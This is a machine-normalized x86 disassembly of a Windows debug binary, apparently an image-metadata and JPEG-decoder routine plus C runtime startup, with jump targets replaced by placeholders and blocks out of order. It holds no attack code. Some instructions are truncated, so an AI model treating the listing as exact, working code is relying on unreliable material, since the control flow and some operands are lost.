fstp [ edx + 0x84 ]
mov ecx [ ebp + 0x14 ]
mov [ ecx + 0x78 ] 0x0
mov eax [ ebp + 0x14 ]
mov [ eax + 0x78 ] 0x1
jmp r-xdata
mov esi esp
push 0x13
mov eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx 0x4d
push ecx
call [ strncpy@IAT ]
add esp 0xc
cmp esi esp
call _chkesp
jmp r-xdata
cmp [ ebp - 0x48 ] 0x9102
je r-xdata
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ecx + 0xa0 ]
imul edx edx 0xc8
mov eax [ ebp + 0x14 ]
mov [ eax + 0xa0 ] edx
mov eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x28 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_418bf0
mov edx [ ebp + 0x14 ]
fstp [ edx + 0x80 ]
jmp r-xdata
cmp [ ebp - 0x48 ] 0x829d
je r-xdata
mov esi esp
push 0x1f
mov eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx 0x5
push ecx
call [ strncpy@IAT ]
add esp 0xc
cmp esi esp
call _chkesp
jmp r-xdata
mov esi esp
push 0x27
mov edx [ ebp - 0x28 ]
push edx
mov eax [ ebp + 0x14 ]
add eax 0x25
push eax
call [ strncpy@IAT ]
add esp 0xc
cmp esi esp
call _chkesp
jmp r-xdata
mov edx [ ebp - 0x20 ]
push edx
mov eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_418bf0
call _ftol
mov ecx [ ebp + 0x14 ]
mov [ ecx + 0x6c ] eax
mov edx [ ebp + 0x14 ]
cmp [ edx + 0x6c ] 0x1
jl r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x28 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_418bf0
call _ftol
mov [ ebp - 0x5c ] eax
mov edx [ ebp - 0x5c ]
sub edx 0x1
mov [ ebp - 0x5c ] edx
cmp [ ebp - 0x5c ] 0x4
ja r-xdata
mov edx [ ebp - 0x20 ]
push edx
mov eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_418bf0
mov ecx [ ebp + 0x14 ]
fstp [ ecx + 0xb4 ]
jmp r-xdata
mov edx [ ebp - 0x20 ]
push edx
mov eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_418bf0
mov ecx [ ebp + 0x14 ]
fstp [ ecx + 0xb8 ]
jmp r-xdata
mov edx [ ebp - 0x20 ]
push edx
mov eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_418bf0
call _ftol
mov [ ebp - 0x14 ] eax
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x104 ] edx
mov eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x28 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_418bf0
mov edx [ ebp + 0x14 ]
fstp [ edx + 0xa8 ]
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0xc ] 0xa
jge r-xdata
mov eax [ ebp - 0xc ]
sub eax 0x1
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x28 ]
add ecx [ ebp - 0xc ]
movsx edx [ ecx ]
cmp edx 0x20
jne r-xdata
mov edx [ ebp + 0x18 ]
push edx
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp - 0x3c ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_418090
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx [ ebp - 0x20 ]
push ecx
mov edx [ ebp - 0x28 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_418bf0
call _ftol
mov ecx [ ebp + 0x14 ]
mov [ ecx + 0xa4 ] eax
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x20 ]
push edx
mov eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_418bf0
mov ecx [ ebp + 0x14 ]
fstp [ ecx + 0x84 ]
jmp r-xdata
cmp [ ebp - 0x48 ] 0x8822
je r-xdata
push r--data
mov ecx [ ebp - 0x4 ]
add ecx 0x4
push ecx
call strcpy
add esp 0x8
mov edx [ ebp + 0x14 ]
mov [ edx + 0x6c ] 0x0
mov eax [ ebp + 0x14 ]
cmp [ eax + 0x6c ] 0x8
jle r-xdata
jmp r-xdata
mov eax [ ebp - 0x5c ]
jmp [ eax * 4 + jump_table_418bc6 ]
jmp r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0xc ]
mov cl [ eax ]
mov [ ebp - 0x38 ] cl
movsx edx [ ebp - 0x38 ]
test edx edx
je r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x28 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_418bf0
call _ftol
mov edx [ ebp + 0x14 ]
mov [ edx + 0x9c ] eax
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ ecx + 0xbc ] 0x3f800000
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx + 0xbc ] 0x3f800000
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov [ eax + 0xbc ] 0x3ec99326
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ ecx + 0xbc ] 0x3d214285
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx + 0xbc ] 0x3825214d
jmp r-xdata
jmp r-xdata
movsx eax [ ebp - 0x38 ]
cmp eax 0x20
je r-xdata
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
mov esi esp
push 0xc7
mov ecx [ ebp - 0x28 ]
add ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp + 0x14 ]
add edx 0xc4
push edx
call [ strncpy@IAT ]
add esp 0xc
cmp esi esp
call _chkesp
jmp r-xdata
sub_418bf0
push ebp
mov ebp esp
sub esp 0x74
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x74 ]
mov ecx 0x1d
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x18 ]
sub ecx 0x1
mov [ ebp - 0x18 ] ecx
cmp [ ebp - 0x18 ] 0xb
ja r-xdata
fld [ ebp - 0xc ]
pop edi
pop esi
pop ebx
add esp 0x74
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x18 ]
jmp [ edx * 4 + jump_table_418d43 ]
mov eax [ ebp + 0x8 ]
movsx ecx [ eax ]
mov [ ebp - 0x1c ] ecx
fild [ ebp - 0x1c ]
fstp [ ebp - 0xc ]
jmp r-xdata
mov edx [ ebp + 0x8 ]
xor eax eax
mov al [ edx ]
mov [ ebp - 0x20 ] eax
fild [ ebp - 0x20 ]
fstp [ ebp - 0xc ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_417f60
mov [ ebp - 0x24 ] eax
fild [ ebp - 0x24 ]
fstp [ ebp - 0xc ]
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_418050
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] 0x0
fild [ ebp - 0x2c ]
fstp [ ebp - 0xc ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_417fc0
mov [ ebp - 0x10 ] eax
mov ecx [ ebp + 0x8 ]
add ecx 0x4
push ecx
mov ecx [ ebp - 0x4 ]
call sub_417fc0
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_417f60
movsx eax ax
mov [ ebp - 0x30 ] eax
fild [ ebp - 0x30 ]
fstp [ ebp - 0xc ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_417fc0
mov [ ebp - 0x34 ] eax
fild [ ebp - 0x34 ]
fstp [ ebp - 0xc ]
jmp r-xdata
mov edx [ ebp + 0x8 ]
fld [ edx ]
fstp [ ebp - 0xc ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ebp - 0xc ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp - 0x8 ] edx
fild [ ebp - 0x10 ]
fidiv [ ebp - 0x14 ]
fstp [ ebp - 0xc ]
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
jmp r-xdata
sub_418d80
push ebp
mov ebp esp
sub esp 0x43c
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x43c ]
mov ecx 0x10f
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x3f8 ] 0x0
cmp [ ebp + 0xc ] 0x3e8
jle r-xdata
mov [ ebp - 0x3fc ] 0x2
jmp r-xdata
mov [ ebp + 0xc ] 0x3e8
mov ecx [ ebp - 0x3fc ]
cmp ecx [ ebp + 0xc ]
jge r-xdata
mov eax [ ebp - 0x3f8 ]
mov [ ebp + eax - 0x3f4 ] 0x0
lea ecx [ ebp - 0x3f4 ]
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
add eax 0xc4
push eax
call strcpy
add esp 0x8
pop edi
pop esi
pop ebx
add esp 0x43c
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x3fc ]
xor eax eax
mov al [ edx ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xd
jne r-xdata
mov esi esp
mov eax [ ebp - 0x8 ]
push eax
call [ isprint@IAT ]
add esp 0x4
cmp esi esp
call _chkesp
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x3fc ]
xor edx edx
mov dl [ ecx + 0x1 ]
cmp edx 0xa
jne r-xdata
mov ecx [ ebp - 0x3f8 ]
mov dl [ ebp - 0x8 ]
mov [ ebp + ecx - 0x3f4 ] dl
mov eax [ ebp - 0x3f8 ]
add eax 0x1
mov [ ebp - 0x3f8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x8 ] 0x9
jne r-xdata
mov eax [ ebp - 0x3fc ]
add eax 0x1
mov [ ebp - 0x3fc ] eax
mov ecx [ ebp - 0x3f8 ]
mov [ ebp + ecx - 0x3f4 ] 0x3f
mov edx [ ebp - 0x3f8 ]
add edx 0x1
mov [ ebp - 0x3f8 ] edx
sub_418ec0
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x4c ]
mov ecx 0x13
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x2 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0x8 ]
add edx 0x3
push edx
mov ecx [ ebp - 0x4 ]
call sub_417f20
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
mov [ edx + 0x64 ] eax
mov eax [ ebp + 0x8 ]
add eax 0x5
push eax
mov ecx [ ebp - 0x4 ]
call sub_417f20
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
mov [ edx + 0x68 ] eax
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x7 ]
mov [ ebp - 0xc ] ecx
cmp [ ebp - 0xc ] 0x3
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
mov [ edx + 0x70 ] 0x0
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
mov [ eax + 0x70 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
mov edx [ ebp + 0xc ]
mov [ ecx + 0x74 ] edx
pop edi
pop esi
pop ebx
add esp 0x4c
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x8
sub_418fe0
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_4190a0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_4193c3
cmp [ rw-data ] ebx
jne r-xdata
call sub_4193ae
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_4193c0
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_401000
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_419250
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0xc ]
mov eax esi
imul eax [ ebp + 0x10 ]
add [ ebp + 0x8 ] eax
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x1c ] 0x1
or [ ebp - 0x4 ] 0xffffffff
call sub_4192b8
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x10
sub [ ebp + 0x8 ] esi
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
dec [ ebp + 0x10 ]
js r-xdata
sub_4192d0
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x10
mov ecx [ ebp + 0x8 ]
sub ecx [ ebp + 0xc ]
mov [ ebp + 0x8 ] ecx
call [ ebp + 0x14 ]
jmp r-xdata
dec [ ebp + 0x10 ]
js r-xdata
sub_419400
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x3e
je r-xdata
cmp [ ebp + 0x10 ] 0x1b0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x18 ] 0x3e
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ ebp + 0xc ]
mov [ eax + 0x1c ] ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc ]
mov [ ebp - 0xc ] eax
push 0x1b0
push 0x0
mov ecx [ ebp + 0x8 ]
push ecx
call memset
add esp 0xc
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov [ edx ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x10 ] 0x1
mov ecx [ ebp + 0x8 ]
push ecx
call sub_41f680
add esp 0x4
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x18 ] 0x0
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x15
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x18 ] 0x1b0
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0x10 ]
mov [ ecx + 0x1c ] edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
cmp [ ebp - 0x4 ] 0x4
jge r-xdata
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax + edx * 4 + 0x90 ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] 0x4
jge r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x10c ] 0x0
mov ecx [ ebp + 0x8 ]
push ecx
call sub_41b1c0
add esp 0x4
mov edx [ ebp + 0x8 ]
push edx
call sub_41ed40
add esp 0x4
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] 0xc8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax + edx * 4 + 0xa0 ] 0x0
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0xb0 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
sub_419580
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
push eax
call sub_420bb0
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4195a0
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0xc8
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_419660
add esp 0x4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x1
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x14 ] 0xc9
je r-xdata
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp [ ebp - 0x8 ] 0x2
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x14
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
mov [ edx + 0x18 ] ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
and ecx 0xff
test ecx ecx
je r-xdata
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_420b30
add esp 0x4
mov [ ebp - 0x4 ] 0x2
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x33
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
sub_419660
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x8 ]
sub edx 0xc8
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x8 ] 0xa
ja r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x14
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
mov [ edx + 0x18 ] ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov ecx [ ebp - 0x8 ]
xor eax eax
mov al [ ecx + lookup_table_419767 ]
jmp [ eax * 4 + jump_table_419753 ]
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x190 ]
call [ ecx + 0x4 ]
add esp 0x4
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
call [ ecx + 0x8 ]
add esp 0x4
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] 0xc9
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x190 ]
call [ edx ]
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x190 ]
call [ ecx ]
add esp 0x4
mov [ ebp - 0x4 ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_419780
add esp 0x4
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] 0xca
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419780
push ebp
mov ebp esp
sub esp 0x5c
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x24 ]
mov [ ebp - 0x14 ] ecx
cmp [ ebp - 0x14 ] 0x1
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x28 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x2c ] 0x1
jmp r-xdata
cmp [ ebp - 0x14 ] 0x3
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x30 ] 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x34 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x38 ] 0x0
mov [ eax + 0x3c ] 0x3ff00000
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x40 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x41 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x44 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x48 ] 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x49 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4a ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4c ] 0x2
mov edx [ ebp + 0x8 ]
mov [ edx + 0x50 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x54 ] 0x100
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x74 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x58 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x59 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x5a ] 0x0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dl [ ecx + 0x100 ]
test edx edx
je r-xdata
cmp [ ebp - 0x14 ] 0x4
je r-xdata
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dl [ ecx + 0x108 ]
test edx edx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x28 ] 0x3
jmp r-xdata
mov edx [ ebp + 0x8 ]
xor eax eax
mov al [ edx + 0x108 ]
test eax eax
je r-xdata
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc4 ]
mov ecx [ eax ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc4 ]
mov ecx [ eax + 0x54 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc4 ]
mov ecx [ eax + 0xa8 ]
mov [ ebp - 0xc ] ecx
cmp [ ebp - 0x4 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov cl [ eax + 0x109 ]
mov [ ebp - 0x18 ] cl
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x2c ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x28 ] 0x4
mov ecx [ ebp + 0x8 ]
mov dl [ ecx + 0x109 ]
mov [ ebp - 0x1c ] dl
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x28 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x2c ] 0x0
cmp [ ebp - 0x4 ] 0x52
jne r-xdata
cmp [ ebp - 0x8 ] 0x2
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x28 ] 0x2
jmp r-xdata
cmp [ ebp - 0x18 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x28 ] 0x4
jmp r-xdata
cmp [ ebp - 0x1c ] 0x2
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
add edx 0x18
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x6f
push 0x1
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
add esp 0x8
xor edx edx
test edx edx
jne r-xdata
cmp [ ebp - 0x8 ] 0x47
jne r-xdata
cmp [ ebp - 0xc ] 0x3
jne r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x28 ] 0x3
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x28 ] 0x5
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x28 ] 0x3
cmp [ ebp - 0xc ] 0x42
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x28 ] 0x3
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x72
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
xor eax eax
mov al [ edx + 0x109 ]
mov [ ecx + 0x18 ] eax
push 0xffffffff
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax + 0x4 ]
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x28 ] 0x3
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x2c ] 0x4
jmp r-xdata
mov edx [ ebp + 0x8 ]
